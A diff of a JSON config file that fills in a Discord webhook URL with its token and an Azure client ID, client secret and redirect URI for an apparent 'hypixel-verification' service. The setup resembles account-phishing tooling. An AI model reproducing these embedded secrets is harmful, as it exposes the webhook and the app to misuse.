@@ -8,7 +8,7 @@
     },
 
     "webhook": {
-        "webhookURL": ""
+        "webhookURL": "https://discord.com/api/webhooks/1122041902003408896/0HRYdUZ-AoniQPRdKeEguK-0oHnihrU4zUM4IcU7oNzweCuGMWHb6bh3FSEtx7XveQ5X"
     },
 
     "discord": {
@@ -16,8 +16,8 @@
     },
 
     "azure" : {
-        "client_id": "",
-        "client_secret": "",
-        "redirect_uri": ""
+        "client_id": "aee010bb-cc6b-4ac2-8506-7df419396889",
+        "client_secret": "141698a8-18a3-4aa4-9129-374592b1845a",
+        "redirect_uri": "https://hypixel-verification-i1he.onrender.com/"
     }
 }
